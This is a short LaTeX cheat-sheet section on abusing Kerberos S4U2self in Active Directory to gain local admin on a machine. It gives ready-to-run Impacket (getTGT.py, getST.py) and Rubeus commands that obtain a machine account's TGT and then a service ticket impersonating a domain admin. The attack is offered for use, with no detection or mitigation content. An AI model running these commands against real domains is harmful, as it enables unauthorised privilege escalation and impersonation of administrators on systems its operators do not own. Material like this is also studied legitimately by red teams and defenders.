\section{S4U2self abuse}
abuse S4U2self for Local Privilege Escalation, or for stealthier alternative to Silver Ticket.

n order to obtain local admin rights on a target machine, the attackers must be able to execute code on the machine and conduct two major steps: obtain a TGT for the machine account, and use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.

\subsection{Linux}

\begin{verbatim}
# Machine account's TGT
getTGT.py -dc-ip "domaincontroller" -hashes :"NThash" "domain"/"machine$"

# Obtain a Service Ticket
export KRB5CCNAME="/path/to/ticket.ccache"
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
\end{verbatim}

\subsection{Windows}

\begin{verbatim}
# Machine account's TGT
Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"

# Obtain a Service Ticket
Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"
\end{verbatim}




\subsection{links}
\begin{itemize}
    \item \url{https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse}
\end{itemize}
